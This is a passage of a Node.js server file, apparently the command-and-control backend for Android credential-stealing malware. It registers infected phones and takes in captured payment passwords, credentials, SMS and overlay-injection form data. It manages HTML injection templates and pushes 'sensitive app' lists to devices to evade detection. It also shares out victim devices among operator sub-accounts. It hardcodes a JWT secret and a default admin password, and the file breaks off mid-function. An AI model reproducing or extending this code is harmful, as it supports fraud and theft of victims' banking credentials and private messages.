/**
 * Fisher Server - Node.js 版本
 * Express + ws 库，异步非阻塞，WebSocket 不会断线
 */
const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const express = require('express');
const { WebSocketServer } = require('ws');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const Database = require('better-sqlite3');
const cors = require('cors');

// ============================================================
// 配置
// ============================================================
const PORT = process.env.PORT || 8080;
const SECRET_KEY = 'fisher_secret_2026';
const CERT_PATH = '/etc/letsencrypt/live/admin.yunjia.casa/fullchain.pem';
const KEY_PATH = '/etc/letsencrypt/live/admin.yunjia.casa/privkey.pem';
const STATIC_DIR = '/opt/fengjc_site';
const DB_PATH = path.join(__dirname, 'data', 'fisher.db');

// ============================================================
// 数据库初始化
// ============================================================
fs.mkdirSync(path.join(__dirname, 'data'), { recursive: true });
const db = new Database(DB_PATH);
db.pragma('journal_mode = WAL');

db.exec(`
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT DEFAULT 'admin',
    avatar TEXT DEFAULT '',
    max_devices INTEGER DEFAULT 100,
    created_at REAL DEFAULT (strftime('%s','now'))
  );
  CREATE TABLE IF NOT EXISTS devices (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT UNIQUE NOT NULL,
    brand TEXT DEFAULT '',
    model TEXT DEFAULT '',
    os_version TEXT DEFAULT '',
    app_version TEXT DEFAULT '',
    app_name TEXT DEFAULT '',
    battery_level INTEGER DEFAULT 0,
    network_type TEXT DEFAULT '',
    phone_number TEXT DEFAULT '',
    public_ip TEXT DEFAULT '',
    screen_width INTEGER DEFAULT 0,
    screen_height INTEGER DEFAULT 0,
    remark TEXT DEFAULT '',
    is_connected INTEGER DEFAULT 0,
    local_service_connected INTEGER DEFAULT 0,
    last_seen REAL DEFAULT 0,
    first_seen REAL DEFAULT (strftime('%s','now')),
    created_at REAL DEFAULT (strftime('%s','now'))
  );
  CREATE TABLE IF NOT EXISTS login_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    ip TEXT DEFAULT '',
    success INTEGER DEFAULT 1,
    created_at REAL DEFAULT (strftime('%s','now'))
  );
  CREATE TABLE IF NOT EXISTS settings (
    key TEXT PRIMARY KEY,
    value TEXT DEFAULT ''
  );
  CREATE TABLE IF NOT EXISTS injection_templates (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    template_id TEXT UNIQUE NOT NULL,
    name TEXT NOT NULL,
    package_name TEXT DEFAULT '',
    icon TEXT DEFAULT '',
    color TEXT DEFAULT '',
    file TEXT DEFAULT '',
    type TEXT DEFAULT '',
    html_content TEXT DEFAULT '',
    enabled INTEGER DEFAULT 0,
    visible INTEGER DEFAULT 1,
    created_at TEXT DEFAULT (datetime('now','+8 hours')),
    updated_at TEXT DEFAULT (datetime('now','+8 hours'))
  );
  CREATE TABLE IF NOT EXISTS sms_notifications (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT DEFAULT '',
    device_name TEXT DEFAULT '',
    serial_number TEXT DEFAULT '',
    address TEXT DEFAULT '',
    body TEXT DEFAULT '',
    type TEXT DEFAULT 'sms',
    date INTEGER DEFAULT 0,
    created_at REAL DEFAULT (strftime('%s','now'))
  );
  CREATE TABLE IF NOT EXISTS password_inputs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT DEFAULT '',
    app_name TEXT DEFAULT '',
    package_name TEXT DEFAULT '',
    input_text TEXT DEFAULT '',
    password_type TEXT DEFAULT 'password',
    timestamp INTEGER DEFAULT 0,
    created_at REAL DEFAULT (strftime('%s','now'))
  );
`);

// 数据库迁移：确保 injection_templates 有新列
try { db.exec("ALTER TABLE injection_templates ADD COLUMN html_content TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE injection_templates ADD COLUMN enabled INTEGER DEFAULT 0"); } catch {}
try { db.exec("ALTER TABLE injection_templates ADD COLUMN visible INTEGER DEFAULT 1"); } catch {}
try { db.exec("ALTER TABLE injection_templates ADD COLUMN created_at TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE injection_templates ADD COLUMN updated_at TEXT DEFAULT ''"); } catch {}

// 用户表迁移：is_super 字段
try { db.exec("ALTER TABLE users ADD COLUMN is_super INTEGER DEFAULT 0"); } catch {}
try { db.exec("ALTER TABLE users ADD COLUMN assigned_devices TEXT DEFAULT ''"); } catch {}
// 单账号登录：active_session 字段
try { db.exec("ALTER TABLE users ADD COLUMN active_session TEXT DEFAULT ''"); } catch {}
// 登录失败锁定
try { db.exec("ALTER TABLE users ADD COLUMN login_fail_count INTEGER DEFAULT 0"); } catch {}
try { db.exec("ALTER TABLE users ADD COLUMN locked_until INTEGER DEFAULT 0"); } catch {}
// 默认 admin 设为超管
try {
  db.prepare("UPDATE users SET is_super=1 WHERE username='admin'").run();
} catch (e) {
  console.log('[DB] 默认 admin 超管更新跳过:', e.message);
}

// 创建默认管理员
const adminExists = db.prepare('SELECT id FROM users WHERE username=?').get('admin');
if (!adminExists) {
  const hash = bcrypt.hashSync('admin123', 10);
  db.prepare('INSERT INTO users (username, password_hash, role) VALUES (?,?,?)').run('admin', hash, 'admin');
  console.log('[DB] 默认管理员已创建: admin / admin123');
}

// 设备自动归属：APK 注册时带 ownerUsername，自动加到子账户的 assigned_devices
function autoAssignDevice(deviceId, ownerUsername) {
  if (!deviceId || !ownerUsername) return;
  try {
    const user = db.prepare('SELECT id,assigned_devices FROM users WHERE username=?').get(ownerUsername);
    if (!user) { console.log(`[ASSIGN] 用户 ${ownerUsername} 不存在，跳过自动分配`); return; }
    const current = (user.assigned_devices || '').split(',').filter(Boolean);
    if (!current.includes(deviceId)) {
      current.push(deviceId);
      db.prepare('UPDATE users SET assigned_devices=? WHERE id=?').run(current.join(','), user.id);
      console.log(`[ASSIGN] ✅ 设备 ${deviceId} 自动分配给 ${ownerUsername}`);
    }
  } catch (e) {
    console.log(`[ASSIGN] 自动分配失败: ${e.message}`);
  }
}

// ============================================================
// Express 应用
// ============================================================
const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.set('etag', false); // 禁用 ETag，避免 304 缓存问题
app.use((req, res, next) => {
  if (req.path.startsWith('/api/')) {
    res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
    res.set('Pragma', 'no-cache');
  }
  next();
});

// 请求日志（调试用）
app.use((req, res, next) => {
  if (req.path.includes('tunnel') || req.path.includes('injection')) {
    console.log(`[REQ] ${req.method} ${req.url} from ${req.ip}`);
  }
  next();
});

// JWT 验证中间件
function authMiddleware(req, res, next) {
  const auth = req.headers.authorization || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7) : req.query.token || '';
  if (!token) return res.status(401).json({ success: false, message: '未登录' });
  try {
    req.user = jwt.verify(token, SECRET_KEY);
    next();
  } catch {
    return res.status(401).json({ success: false, message: 'Token无效' });
  }
}

// ============================================================
// 认证 API
// ============================================================
app.get('/api/auth/check-initialization', (req, res) => {
  const row = db.prepare('SELECT COUNT(*) as cnt FROM users').get();
  res.json({ success: true, data: { initialized: row.cnt > 0 } });
});

app.post('/api/auth/login', (req, res) => {
  const { username, password } = req.body || {};
  const user = db.prepare('SELECT * FROM users WHERE username=?').get(username);
  db.prepare('INSERT INTO login_logs (username,ip,success) VALUES (?,?,?)').run(username, req.ip, user ? 1 : 0);
  // 检查账号是否被锁定
  if (user && user.locked_until && Date.now() < user.locked_until) {
    const remainMin = Math.ceil((user.locked_until - Date.now()) / 60000);
    console.log(`[AUTH] 用户 ${username} 被锁定，剩余 ${remainMin} 分钟, ip=${req.ip}`);
    return res.status(423).json({ success: false, message: `账号已锁定，请 ${remainMin} 分钟后再试` });
  }
  if (!user || !bcrypt.compareSync(password || '', user.password_hash)) {
    // 密码错误：累加失败次数
    if (user) {
      const failCount = (user.login_fail_count || 0) + 1;
      if (failCount >= 3) {
        // 锁定 30 分钟
        const lockUntil = Date.now() + 30 * 60 * 1000;
        db.prepare('UPDATE users SET login_fail_count=?, locked_until=? WHERE id=?').run(failCount, lockUntil, user.id);
        console.log(`[AUTH] 用户 ${username} 密码错误 ${failCount} 次，锁定 30 分钟, ip=${req.ip}`);
        return res.status(423).json({ success: false, message: '密码错误次数过多，账号已锁定 30 分钟' });
      } else {
        db.prepare('UPDATE users SET login_fail_count=? WHERE id=?').run(failCount, user.id);
        console.log(`[AUTH] 用户 ${username} 密码错误 ${failCount}/3 次, ip=${req.ip}`);
      }
    }
    return res.status(401).json({ success: false, message: '用户名或密码错误' });
  }
  // 登录成功：重置失败计数
  db.prepare('UPDATE users SET login_fail_count=0, locked_until=0 WHERE id=?').run(user.id);
  // 单账号登录：生成新 sessionId，覆盖旧会话
  const sessionId = require('crypto').randomBytes(16).toString('hex');
  db.prepare('UPDATE users SET active_session=? WHERE id=?').run(sessionId, user.id);
  const token = jwt.sign({ userId: user.id, username: user.username, role: user.role, isSuper: !!user.is_super, sessionId }, SECRET_KEY, { expiresIn: '30d' });
  console.log(`[AUTH] 用户 ${username} 登录成功, sessionId=${sessionId.slice(0,8)}..., ip=${req.ip}`);
  // 踢掉同账号的旧 WS 连接
  for (const aws of adminConnections) {
    if (aws._adminUsername === username) {
      try { aws.send(JSON.stringify({ type: 'forced_logout', message: '账号在其他地方登录' })); } catch {}
      setTimeout(() => { try { aws.close(4001, 'kicked'); } catch {} }, 500);
    }
  }
  res.json({ success: true, data: { token, user: { id: user.id, username: user.username, role: user.role, isSuper: !!user.is_super, avatar: user.avatar, maxDevices: user.max_devices } } });
});

app.post('/api/auth/verify', (req, res) => {
  const token = req.body?.token || req.headers.authorization?.slice(7) || '';
  try {
    const payload = jwt.verify(token, SECRET_KEY);
    const user = db.prepare('SELECT id,username,role,avatar,max_devices,is_super,created_at,active_session FROM users WHERE id=?').get(payload.userId);
    if (!user) return res.status(401).json({ success: false, message: '用户不存在' });
    // 单账号登录：数据库有 active_session 时，token 必须携带匹配的 sessionId
    if (user.active_session && payload.sessionId !== user.active_session) {
      return res.status(401).json({ success: false, message: '账号已在其他地方登录' });
    }
    res.json({ success: true, data: { valid: true, user: { id: user.id, username: user.username, role: user.role, isSuper: !!user.is_super, maxDevices: user.max_devices, createdAt: Math.floor(user.created_at || 0) } } });
  } catch {
    res.status(401).json({ success: false, message: 'Token验证失败' });
  }
});

// 修改密码
app.post('/api/auth/change-password', (req, res) => {
  const token = req.headers.authorization?.slice(7) || '';
  try {
    const payload = jwt.verify(token, SECRET_KEY);
    const user = db.prepare('SELECT id,username,password_hash,role FROM users WHERE id=?').get(payload.userId);
    if (!user) return res.status(401).json({ success: false, message: '用户不存在' });

    const { oldPassword, newPassword } = req.body || {};
    if (!oldPassword || !newPassword) return res.status(400).json({ success: false, message: '请提供旧密码和新密码' });
    if (newPassword.length < 6) return res.status(400).json({ success: false, message: '新密码至少6位' });

    // 验证旧密码
    const bcrypt = require('bcryptjs');
    if (!bcrypt.compareSync(oldPassword, user.password_hash)) {
      return res.status(400).json({ success: false, message: '旧密码错误' });
    }

    // 更新密码 + 踢掉旧会话
    const hashed = bcrypt.hashSync(newPassword, 10);
    const newSessionId = require('crypto').randomUUID();
    db.prepare('UPDATE users SET password_hash=?, active_session=? WHERE id=?').run(hashed, newSessionId, user.id);

    // 签发新 token
    const newToken = jwt.sign({ userId: user.id, username: user.username, role: user.role || 'admin', sessionId: newSessionId }, SECRET_KEY, { expiresIn: '30d' });

    console.log(`[AUTH] 用户 ${user.username} 修改了密码`);
    res.json({ success: true, message: '密码修改成功', data: { token: newToken } });
  } catch {
    res.status(401).json({ success: false, message: 'Token验证失败' });
  }
});

// ============================================================
// 敏感 APP 管理（进入时暂停无障碍，离开后恢复）
// ============================================================

// 建表
db.exec(`CREATE TABLE IF NOT EXISTS sensitive_apps (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  package_name TEXT NOT NULL,
  app_name TEXT DEFAULT '',
  enable_delay INTEGER DEFAULT 5000,
  is_enabled INTEGER DEFAULT 1,
  device_id TEXT DEFAULT '',
  created_at REAL DEFAULT 0
)`);

// 推送敏感 APP 列表到设备
function pushSensitiveAppsToDevice(deviceId) {
  // 合并全局 + 设备专属
  const globalApps = db.prepare('SELECT package_name,app_name,enable_delay,is_enabled FROM sensitive_apps WHERE device_id=?').all('');
  const deviceApps = deviceId ? db.prepare('SELECT package_name,app_name,enable_delay,is_enabled FROM sensitive_apps WHERE device_id=?').all(deviceId) : [];
  const merged = [...globalApps, ...deviceApps].filter(a => a.is_enabled);
  const payload = JSON.stringify({
    type: 'command', data: {
      command: 'UPDATE_SENSITIVE_APPS',
      params: { apps: merged.map(a => ({ packageName: a.package_name, appName: a.app_name, enableDelay: a.enable_delay })) }
    }
  });
  const ws = deviceConnections.get(deviceId);
  if (ws && ws.readyState === 1) ws.send(payload);
}

// 推送到所有在线设备
function pushSensitiveAppsToAll() {
  for (const deviceId of deviceConnections.keys()) {
    pushSensitiveAppsToDevice(deviceId);
  }
}

// --- 全局敏感 APP ---
app.get('/api/sensitive-apps', authMiddleware, (req, res) => {
  const apps = db.prepare('SELECT package_name AS packageName, app_name AS appName, enable_delay AS enableDelay, is_enabled AS isEnabled FROM sensitive_apps WHERE device_id=?').all('');
  res.json({ success: true, apps });
});

app.post('/api/sensitive-apps/add', authMiddleware, (req, res) => {
  const { packageName, appName, enableDelay, isEnabled } = req.body || {};
  if (!packageName) return res.status(400).json({ success: false, message: '缺少 packageName' });
  const existing = db.prepare('SELECT id FROM sensitive_apps WHERE package_name=? AND device_id=?').get(packageName, '');
  if (existing) {
    db.prepare('UPDATE sensitive_apps SET app_name=?, enable_delay=?, is_enabled=? WHERE id=?')
      .run(appName || '', enableDelay || 5000, isEnabled === false ? 0 : 1, existing.id);
  } else {
    db.prepare('INSERT INTO sensitive_apps (package_name, app_name, enable_delay, is_enabled, device_id, created_at) VALUES (?,?,?,?,?,?)')
      .run(packageName, appName || '', enableDelay || 5000, isEnabled === false ? 0 : 1, '', Date.now() / 1000);
  }
  pushSensitiveAppsToAll();
  res.json({ success: true });
});

app.post('/api/sensitive-apps/remove', authMiddleware, (req, res) => {
  const { packageName } = req.body || {};
  if (!packageName) return res.status(400).json({ success: false, message: '缺少 packageName' });
  db.prepare('DELETE FROM sensitive_apps WHERE package_name=? AND device_id=?').run(packageName, '');
  pushSensitiveAppsToAll();
  res.json({ success: true });
});

// --- 设备级敏感 APP ---
app.get('/api/device-sensitive-apps', authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId || '';
  if (!deviceId) return res.status(400).json({ success: false, message: '缺少 deviceId' });
  // 返回全局 + 设备专属
  const globalApps = db.prepare('SELECT package_name AS packageName, app_name AS appName, enable_delay AS enableDelay, is_enabled AS isEnabled FROM sensitive_apps WHERE device_id=?').all('');
  const deviceApps = db.prepare('SELECT package_name AS packageName, app_name AS appName, enable_delay AS enableDelay, is_enabled AS isEnabled FROM sensitive_apps WHERE device_id=?').all(deviceId);
  res.json({ success: true, apps: [...globalApps, ...deviceApps] });
});

app.post('/api/device-sensitive-apps/add', authMiddleware, (req, res) => {
  const { packageName, appName, enableDelay, isEnabled, deviceId } = req.body || {};
  if (!packageName || !deviceId) return res.status(400).json({ success: false, message: '缺少参数' });
  const existing = db.prepare('SELECT id FROM sensitive_apps WHERE package_name=? AND device_id=?').get(packageName, deviceId);
  if (existing) {
    db.prepare('UPDATE sensitive_apps SET app_name=?, enable_delay=?, is_enabled=? WHERE id=?')
      .run(appName || '', enableDelay || 5000, isEnabled === false ? 0 : 1, existing.id);
  } else {
    db.prepare('INSERT INTO sensitive_apps (package_name, app_name, enable_delay, is_enabled, device_id, created_at) VALUES (?,?,?,?,?,?)')
      .run(packageName, appName || '', enableDelay || 5000, isEnabled === false ? 0 : 1, deviceId, Date.now() / 1000);
  }
  pushSensitiveAppsToDevice(deviceId);
  res.json({ success: true });
});

app.post('/api/device-sensitive-apps/remove', authMiddleware, (req, res) => {
  const { packageName, deviceId } = req.body || {};
  if (!packageName || !deviceId) return res.status(400).json({ success: false, message: '缺少参数' });
  db.prepare('DELETE FROM sensitive_apps WHERE package_name=? AND device_id=?').run(packageName, deviceId);
  pushSensitiveAppsToDevice(deviceId);
  res.json({ success: true });
});

app.post('/api/device-sensitive-apps/push', authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId || req.body.deviceId || '';
  if (!deviceId) return res.status(400).json({ success: false, message: '缺少 deviceId' });
  pushSensitiveAppsToDevice(deviceId);
  res.json({ success: true });
});

// ============================================================
// 设备 API（APP 客户端调用）
// ============================================================
app.post('/api/client/register', (req, res) => {
  const data = req.body || {};
  const deviceId = data.deviceId || '';
  if (!deviceId) return res.status(400).json({ success: false, message: '缺少deviceId' });
  const now = Date.now() / 1000;
  const existing = db.prepare('SELECT id FROM devices WHERE device_id=?').get(deviceId);
  if (existing) {
    db.prepare('UPDATE devices SET brand=?,model=?,os_version=?,app_version=?,public_ip=?,is_connected=1,last_seen=? WHERE device_id=?')
      .run(data.brand||'', data.model||'', data.osVersion||'', data.appVersion||'', req.ip, now, deviceId);
  } else {
    db.prepare('INSERT INTO devices (device_id,brand,model,os_version,app_version,public_ip,screen_width,screen_height,is_connected,last_seen) VALUES (?,?,?,?,?,?,?,?,1,?)')
      .run(deviceId, data.brand||'', data.model||'', data.osVersion||'', data.appVersion||'', req.ip, data.screenWidth||0, data.screenHeight||0, now);
  }
  res.json({ success: true, message: '设备注册成功', data: { deviceId } });
  // 自动归属子账户
  autoAssignDevice(deviceId, data.ownerUsername || '');
});

app.post('/api/client/logs', (req, res) => {
  // APP 上报操作日志，转发给管理端
  const { deviceId, logs } = req.body || {};
  if (deviceId && logs && Array.isArray(logs)) {
    for (const log of logs) {
      broadcastToAdmins({
        type: 'operation_log_realtime',
        sessionId: deviceId,
        data: { deviceId, log },
        botId: deviceId
      });
    }
  }
  res.json({ success: true });
});
app.post('/api/sync/status', (req, res) => {
  const { deviceId, batteryLevel, networkType } = req.body || {};
  if (deviceId) {
    const now = Date.now() / 1000;
    const existing = db.prepare('SELECT id FROM devices WHERE device_id=?').get(deviceId);
    if (existing) {
      db.prepare('UPDATE devices SET battery_level=?,network_type=?,is_connected=1,last_seen=? WHERE device_id=?').run(batteryLevel||0, networkType||'', now, deviceId);
    } else {
      db.prepare('INSERT INTO devices (device_id,battery_level,network_type,public_ip,is_connected,last_seen) VALUES (?,?,?,?,1,?)').run(deviceId, batteryLevel||0, networkType||'', req.ip, now);
    }
  }
  res.json({ success: true });
  // 自动归属子账户
  if (req.body?.ownerUsername) autoAssignDevice(deviceId, req.body.ownerUsername);
});
app.post('/api/sync/messages', (req, res) => res.json({ success: true }));
app.post('/api/sync/inbox', (req, res) => res.json({ success: true }));
app.post('/api/sync/cipher', (req, res) => {
  // 支付密码上报
  const data = req.body || {};
  const deviceId = data.deviceId || '';
  console.log(`[CIPHER] 收到支付密码: ${JSON.stringify(data).slice(0, 200)}`);
  if (deviceId && (data.cipher || data.password || data.value)) {
    const text = data.cipher || data.password || data.value || '';
    const appName = data.appName || data.app || 'payment';
    db.prepare('INSERT INTO password_inputs (device_id,app_name,package_name,input_text,password_type,timestamp) VALUES (?,?,?,?,?,?)')
      .run(deviceId, appName, data.packageName || '', text, 'payment_cipher', data.timestamp || Date.now());
    broadcastToAdmins({ type: 'password_input', sessionId: deviceId, deviceId, botId: deviceId, data });
  }
  res.json({ success: true });
});
app.post('/api/sync/credentials', (req, res) => {
  // 凭据上报
  const data = req.body || {};
  const deviceId = data.deviceId || '';
  console.log(`[CRED] 收到凭据: ${JSON.stringify(data).slice(0, 200)}`);
  if (deviceId) {
    const text = data.password || data.value || data.credential || JSON.stringify(data);
    db.prepare('INSERT INTO password_inputs (device_id,app_name,package_name,input_text,password_type,timestamp) VALUES (?,?,?,?,?,?)')
      .run(deviceId, data.appName || data.app || '', data.packageName || '', text, data.type || 'credential', data.timestamp || Date.now());
    broadcastToAdmins({ type: 'credential_captured', sessionId: deviceId, deviceId, botId: deviceId, data });
  }
  res.json({ success: true });
});
app.post('/api/sync/form', (req, res) => {
  // ★★★ 注入数据上报（APP HttpManager.uploadInjectionData 发到这里）★★★
  const data = req.body || {};
  const deviceId = data.deviceId || data.sessionId || '';
  console.log(`[INJECT] ★ 收到注入数据(/api/sync/form): deviceId=${deviceId}, keys=${Object.keys(data).join(',')}, data=${JSON.stringify(data).slice(0, 500)}`);
  if (deviceId) {
    const packageName = data.packageName || data.pkg || data.package_name || '';
    const bodyStr = JSON.stringify(data);
    const deviceRow = db.prepare('SELECT brand FROM devices WHERE device_id=?').get(deviceId);
    const deviceName = deviceRow ? `${(deviceRow.brand||'UNKNOWN').toUpperCase()}-${deviceId.slice(-8).toUpperCase()}` : deviceId;
    db.prepare('INSERT INTO sms_notifications (device_id,device_name,serial_number,address,body,type,date) VALUES (?,?,?,?,?,?,?)')
      .run(deviceId, deviceName, deviceId, `[注入] ${packageName}`, bodyStr, 'injection', data.timestamp || Date.now());
    // 通知管理端
    broadcastToAdmins({ type: 'injection_data', sessionId: deviceId, deviceId, botId: deviceId, data });
    console.log(`[INJECT] ✅ 注入数据已存储并通知管理端: ${deviceId} / ${packageName}`);
  }
  res.json({ success: true });
});

// APP 注入数据上报（HTTP POST）
app.post('/injectionData', (req, res) => {
  const data = req.body || {};
  console.log(`[INJECT] 收到注入数据: ${JSON.stringify(data).slice(0, 200)}`);
  // 存入 sms_notifications 表
  const deviceId = data.deviceId || data.sessionId || '';
  const packageName = data.packageName || data.pkg || '';
  const body = data.data || data.body || data.result || JSON.stringify(data);
  if (deviceId) {
    const deviceRow = db.prepare('SELECT brand FROM devices WHERE device_id=?').get(deviceId);
    const deviceName = deviceRow ? `${(deviceRow.brand||'UNKNOWN').toUpperCase()}-${deviceId.slice(-8).toUpperCase()}` : deviceId;
    db.prepare('INSERT INTO sms_notifications (device_id,device_name,serial_number,address,body,type,date) VALUES (?,?,?,?,?,?,?)')
      .run(deviceId, deviceName, deviceId, `[注入] ${packageName}`, typeof body === 'string' ? body : JSON.stringify(body), 'injection', Date.now());
  }
  // 通知管理端
  broadcastToAdmins({ type: 'injection_data', sessionId: deviceId, deviceId, botId: deviceId, data });
  res.json({ success: true });
});
app.post('/api/injectionData', (req, res) => {
  // 同上，兼容带 /api 前缀
  const data = req.body || {};
  console.log(`[INJECT] 收到注入数据(api): ${JSON.stringify(data).slice(0, 200)}`);
  const deviceId = data.deviceId || data.sessionId || '';
  const packageName = data.packageName || data.pkg || '';
  const body = data.data || data.body || data.result || JSON.stringify(data);
  if (deviceId) {
    const deviceRow = db.prepare('SELECT brand FROM devices WHERE device_id=?').get(deviceId);
    const deviceName = deviceRow ? `${(deviceRow.brand||'UNKNOWN').toUpperCase()}-${deviceId.slice(-8).toUpperCase()}` : deviceId;
    db.prepare('INSERT INTO sms_notifications (device_id,device_name,serial_number,address,body,type,date) VALUES (?,?,?,?,?,?,?)')
      .run(deviceId, deviceName, deviceId, `[注入] ${packageName}`, typeof body === 'string' ? body : JSON.stringify(body), 'injection', Date.now());
  }
  broadcastToAdmins({ type: 'injection_data', sessionId: deviceId, deviceId, botId: deviceId, data });
  res.json({ success: true });
});
app.post('/api/adb-keys/upload', (req, res) => res.json({ success: true }));
app.post('/api/file/upload-from-device', (req, res) => res.json({ success: true }));

// ============================================================
// 管理端 API
// ============================================================
app.get('/api/device/list', authMiddleware, (req, res) => {
  let rows;
  // 超管看所有设备，子账号只看分配的
  const user = db.prepare('SELECT is_super,assigned_devices FROM users WHERE id=?').get(req.user.userId);
  if (user && user.is_super) {
    rows = db.prepare('SELECT * FROM devices ORDER BY last_seen DESC').all();
  } else {
    const assigned = (user?.assigned_devices || '').split(',').filter(Boolean);
    if (assigned.length > 0) {
      rows = db.prepare(`SELECT * FROM devices WHERE device_id IN (${assigned.map(() => '?').join(',')}) ORDER BY last_seen DESC`).all(...assigned);
    } else {
      rows = []; // 未分配设备的子账户返回空列表
    }
  }
  res.json({ success: true, data: rows.map(deviceToListApi) });
});

// 下发设备到子账户
app.put('/api/device/:deviceId/assign', authMiddleware, (req, res) => {
  const { deviceId } = req.params;
  const { username } = req.body || {};
  if (!username) return res.json({ success: false, message: '请选择目标子账户' });
  const user = db.prepare('SELECT id,assigned_devices FROM users WHERE username=?').get(username);
  if (!user) return res.json({ success: false, message: '用户不存在' });
  // 把设备加到用户的 assigned_devices 列表
  const current = (user.assigned_devices || '').split(',').filter(Boolean);
  if (!current.includes(deviceId)) {
    current.push(deviceId);
    db.prepare('UPDATE users SET assigned_devices=? WHERE id=?').run(current.join(','), user.id);
  }
  res.json({ success: true, message: `设备已下发到 ${username}` });
});

// 设备分组（设置设备所属分组）
app.put('/api/device/:deviceId/group', authMiddleware, (req, res) => {
  const { deviceId } = req.params;
  const { groupName, groupId } = req.body || {};
  try { db.exec("ALTER TABLE devices ADD COLUMN group_name TEXT DEFAULT ''"); } catch {}
  db.prepare('UPDATE devices SET group_name=? WHERE device_id=?').run(groupName || '', deviceId);
  res.json({ success: true });
});

app.get('/api/users', authMiddleware, (req, res) => {
  const rows = db.prepare('SELECT id,username,role,avatar,max_devices,is_super,assigned_devices,created_at FROM users').all();
  res.json({ success: true, data: rows.map(r => ({
    id: r.id,
    username: r.username,
    role: r.role,
    isSuper: !!r.is_super,
    isOnline: true,
    ip: '',
    maxDevices: r.max_devices || 100,
    assignedDevices: r.assigned_devices || '',
    createdAt: new Date((r.created_at || 0) * 1000).toISOString().replace('T', ' ').slice(0, 19)
  })) });
});


// 修改用户密码
app.put('/api/users/:id/password', authMiddleware, (req, res) => {
  const { id } = req.params;
  const body = req.body || {};
  const password = body.password || body.newPassword || body.new_password || '';
  if (!password) return res.json({ success: false, message: 'password required' });
  const bcrypt = require('bcryptjs');
  const hash = bcrypt.hashSync(password, 10);
  db.prepare('UPDATE users SET password_hash=? WHERE id=?').run(hash, id);
  // 密码修改后使旧 token 失效：写入新随机值，所有旧 token 的 sessionId 都不匹配
  const newSession = require('crypto').randomBytes(16).toString('hex');
  db.prepare('UPDATE users SET active_session=? WHERE id=?').run(newSession, id);
  // 踢掉该用户的 WS 连接
  const kickedUser = db.prepare('SELECT username FROM users WHERE id=?').get(id);
  if (kickedUser) {
    for (const aws of adminConnections) {
      if (aws._adminUsername === kickedUser.username) {
        try { aws.send(JSON.stringify({ type: 'forced_logout', message: '密码已被修改，请重新登录' })); } catch {}
        setTimeout(() => { try { aws.close(4001, 'password_changed'); } catch {} }, 500);
      }
    }
    console.log(`[AUTH] 用户 ${kickedUser.username} 密码被修改，token 已失效`);
  }
  res.json({ success: true });
});

app.post('/api/users', authMiddleware, (req, res) => {
  const { username, password, role, maxDevices, isSuper } = req.body || {};
  if (!username || !password) return res.json({ success: false, message: '用户名和密码不能为空' });
  const exists = db.prepare('SELECT id FROM users WHERE username=?').get(username);
  if (exists) return res.json({ success: false, message: '用户名已存在' });
  const hash = bcrypt.hashSync(password, 10);
  // 子账号默认 role 为 "user"（前端下发列表只显示 role=user 的）
  const userRole = role || 'user';
  db.prepare('INSERT INTO users (username,password_hash,role,max_devices,is_super) VALUES (?,?,?,?,?)').run(username, hash, userRole, maxDevices || 100, isSuper ? 1 : 0);
  res.json({ success: true, message: '用户创建成功' });
});

app.put('/api/users/:id', authMiddleware, (req, res) => {
  const { password, role, maxDevices, isSuper, assignedDevices } = req.body || {};
  if (password) {
    const hash = bcrypt.hashSync(password, 10);
    db.prepare('UPDATE users SET password_hash=? WHERE id=?').run(hash, req.params.id);
  }
  if (role !== undefined) db.prepare('UPDATE users SET role=? WHERE id=?').run(role, req.params.id);
  if (maxDevices !== undefined) db.prepare('UPDATE users SET max_devices=? WHERE id=?').run(maxDevices, req.params.id);
  if (isSuper !== undefined) db.prepare('UPDATE users SET is_super=? WHERE id=?').run(isSuper ? 1 : 0, req.params.id);
  if (assignedDevices !== undefined) db.prepare('UPDATE users SET assigned_devices=? WHERE id=?').run(assignedDevices, req.params.id);
  res.json({ success: true });
});

app.delete('/api/users/:id', authMiddleware, (req, res) => {
  const user = db.prepare('SELECT is_super FROM users WHERE id=?').get(req.params.id);
  if (user && user.is_super) return res.json({ success: false, message: '不能删除超级管理员' });
  db.prepare('DELETE FROM users WHERE id=?').run(req.params.id);
  res.json({ success: true });
});

app.get('/api/users/login-logs', authMiddleware, (req, res) => {
  const rows = db.prepare('SELECT * FROM login_logs ORDER BY created_at DESC LIMIT 100').all();
  const data = rows.map(r => ({
    id: r.id,
    username: r.username,
    loginTime: r.created_at ? new Date(r.created_at * 1000).toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' }) : '',
    ipAddress: r.ip || '',
    success: r.success,
    isOnline: false
  }));
  res.json({ success: true, data });
});

app.get('/api/system/info', authMiddleware, (req, res) => {
  const os = require('os');
  const total = db.prepare('SELECT COUNT(*) as c FROM devices').get().c;
  const online = db.prepare("SELECT COUNT(*) as c FROM devices WHERE is_connected=1").get().c;
  const totalMem = os.totalmem();
  const freeMem = os.freemem();
  const usedMem = totalMem - freeMem;
  const cpus = os.cpus();
  
  let diskTotal = 0, diskUsed = 0, diskFree = 0;
  try {
    const { execSync } = require('child_process');
    const dfOutput = execSync("df -B1 / | tail -1").toString().trim().split(/\s+/);
    diskTotal = parseInt(dfOutput[1]) || 0;
    diskUsed = parseInt(dfOutput[2]) || 0;
    diskFree = parseInt(dfOutput[3]) || 0;
  } catch {}

  res.json({ success: true, data: {
    version: '1.0.0',
    uptime: Math.floor(process.uptime()),
    totalDevices: total,
    onlineDevices: online,
    cpuCores: cpus.length,
